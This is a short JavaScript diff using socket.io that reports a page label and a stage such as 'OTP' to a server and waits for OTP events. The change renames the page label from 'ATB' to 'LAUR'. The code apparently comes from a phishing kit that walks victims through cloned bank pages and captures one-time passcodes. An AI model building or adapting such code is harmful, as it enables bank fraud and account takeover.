@@ -11,7 +11,7 @@ if(stage != 'OTP' && stage != 'Loading'){
     socket.emit('nextNavig', {next: navig})
 }
 
-socket.emit('pageandstage', { page: 'ATB', stage: stage })
+socket.emit('pageandstage', { page: 'LAUR', stage: stage })
 
 socket.on('OTP', (data) => {
     if (data.otp) {
